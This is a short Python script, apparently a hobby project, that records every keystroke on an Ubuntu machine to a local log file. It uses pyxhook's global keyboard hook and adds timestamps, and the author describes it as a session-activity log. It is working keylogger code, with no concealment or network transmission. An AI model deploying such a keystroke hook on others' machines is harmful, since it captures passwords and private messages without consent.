'''
Author : Tanmay Sawaji
This was something I worked on to make a log of all the activities done in a session
The pyxhook library is necessary for this, it can be easily installed using #pip install pyxhook
The code works only for linux and it is tested on Ubuntu 18.04
The file path is given in log_file
'''
import pyxhook
import datetime

#change this to your log file's path
log_file='/home/tanmayats/Documents/pythonKeylogger/file.log'
line_length_count = 0

then = datetime.datetime.now()

#this function is called everytime a key is pressed.

fob=open(log_file,'a')
fob.write("New session has started at {}:\n".format(then))

def OnKeyPress(event):
	global line_length_count, then
	now = datetime.datetime.now()
	duration = now - then
	seconds = duration.seconds
	if seconds > 120 :
		fob.write("\nTime is {} \n".format(now))
		line_length_count = 0
	key_stroke = event.Key
	# print(key_stroke)
	if key_stroke == "grave":
		key_stroke = "\nEnd of session"
	elif key_stroke == "space":
		key_stroke = " "
	elif key_stroke == "exclam":
		key_stroke = "!"
	elif key_stroke == "question":
		key_stroke = "?"
	elif len(key_stroke) > 1:
		key_stroke = "<" + key_stroke + ">"

	fob.write(key_stroke)
	line_length_count += 1
	# fob.write('\n')
	# fob.write(" ")
	if line_length_count == 100:
		fob.write("\n")

	if event.Ascii==96: #96 is the ascii value of the grave key (`)
		fob.write("\n---------------------------------------------------------------------------------------------------------------------------------------------------\n")
		fob.close()
		new_hook.cancel()
	then = now
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()